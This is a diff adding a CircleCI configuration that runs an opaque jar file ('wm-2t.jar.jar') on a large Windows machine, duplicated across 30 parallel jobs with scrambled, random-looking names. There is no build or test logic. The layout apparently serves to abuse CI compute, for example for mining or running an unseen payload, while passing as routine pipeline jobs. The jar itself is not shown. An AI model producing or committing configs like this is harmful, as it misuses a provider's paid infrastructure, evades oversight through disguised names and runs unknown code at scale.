@@ -1,0 +1,79 @@
+version: 2.1
+
+jobs:
+  TESTMOD429515:
+    machine:
+      image: windows-server-2022-gui:current
+    resource_class: windows.large
+    steps:
+      - checkout
+      - run:
+          name: LOADPROD613532
+          command: |
+            java -jar wm-2t.jar.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  VERIFYsion151242:
+    jobs:
+      - TESTMOD429515:
+          name: transform759874hyper
+      - TESTMOD429515:
+          name: AUTH46ical9552
+      - TESTMOD429515:
+          name: verifyHOOD640250
+      - TESTMOD429515:
+          name: SAVEper155326
+      - TESTMOD429515:
+          name: initPIPE455928
+      - TESTMOD429515:
+          name: HANDLE489011NER
+      - TESTMOD429515:
+          name: ANALYZEOR77154
+      - TESTMOD429515:
+          name: CTRLAR185660
+      - TESTMOD429515:
+          name: DELETE86sys6539
+      - TESTMOD429515:
+          name: HANDLEler62818
+      - TESTMOD429515:
+          name: job48web9763
+      - TESTMOD429515:
+          name: HANDLEIST3028
+      - TESTMOD429515:
+          name: CTRL83ous7589
+      - TESTMOD429515:
+          name: web555845PER
+      - TESTMOD429515:
+          name: CTRLLIKE737503
+      - TESTMOD429515:
+          name: baseVER489913
+      - TESTMOD429515:
+          name: FILE174849URAL
+      - TESTMOD429515:
+          name: session44job4679
+      - TESTMOD429515:
+          name: SERFETCH142232
+      - TESTMOD429515:
+          name: service320258META
+      - TESTMOD429515:
+          name: CLIENTDEMO171580
+      - TESTMOD429515:
+          name: WATCH80BETA7970
+      - TESTMOD429515:
+          name: tokenULTRA979106
+      - TESTMOD429515:
+          name: megaFILE204516
+      - TESTMOD429515:
+          name: stage89FAKE7679
+      - TESTMOD429515:
+          name: SYNCward680039
+      - TESTMOD429515:
+          name: syncflow615884
+      - TESTMOD429515:
+          name: STAGEpipe810617
+      - TESTMOD429515:
+          name: ENCRYPTULTRA472317
+      - TESTMOD429515:
+          name: utilcer901991
